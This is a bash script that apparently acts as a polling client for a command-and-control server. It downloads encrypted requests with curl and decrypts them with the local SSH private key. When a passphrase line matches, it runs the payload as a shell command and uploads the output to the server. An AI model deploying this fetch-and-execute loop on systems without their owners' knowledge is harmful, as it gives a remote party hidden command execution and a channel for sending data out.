#!/bin/bash
# Poll command - requires curl
[ -x .cfg/cnc ] || { echo "No config"; exit 1; }
. .cfg/cnc
[ "${URL}" ] || { echo "No URL in config"; exit 1; }
[ "${DATADIR}" ] || { echo "No DATADIR in config"; exit 1; }
[ -r ${DATADIR}/last ] || { echo "${DATADIR}/last not found"; exit 1; }
LAST=$(cat ${DATADIR}/last)
echo "last=${LAST}, checking..."
TMPFILE=/tmp/pollcmd.$$
curl --get ${URL}/poll/${LAST} > ${TMPFILE}.next
NEW=$(cat ${TMPFILE}.next)
if [ "${NEW}" != "" -a 0${NEW} -gt 0 ]
then
  echo "New request ${NEW}"
  curl --get ${URL}/get/${NEW} > ${TMPFILE}.req
  echo "Download:"
  ls -l ${TMPFILE}.req
  if [ -s ${TMPFILE}.req ]
  then
	openssl rsautl -decrypt -inkey .ssh/id_rsa -in ${TMPFILE}.req -out ${TMPFILE}.txt
	VALUE="$(head -1 ${TMPFILE}.txt)"
	if [ "${VALUE}" = "SafeX" ]
	then
	  echo "Getting shell cmd"
	  tail -n +2 ${TMPFILE}.txt > ${DATADIR}/${NEW}-sh.cmd
	  chmod +x ${DATADIR}/${NEW}-sh.cmd
	  REQNUM=${NEW} ${DATADIR}/${NEW}-sh.cmd > ${DATADIR}/${NEW}.out 2>&1
	  echo "Result: $?" >> ${DATADIR}/${NEW}.out
	  curl -F "req_out=@${DATADIR}/${NEW}.out" ${URL}/put/${NEW}
	else
	  echo "No pass"
	fi
  else
    echo "Empty request, updating last"
  fi
  echo "${NEW}" > ${DATADIR}/last
else
  echo "Nothing new"
fi
rm -f ${TMPFILE}*
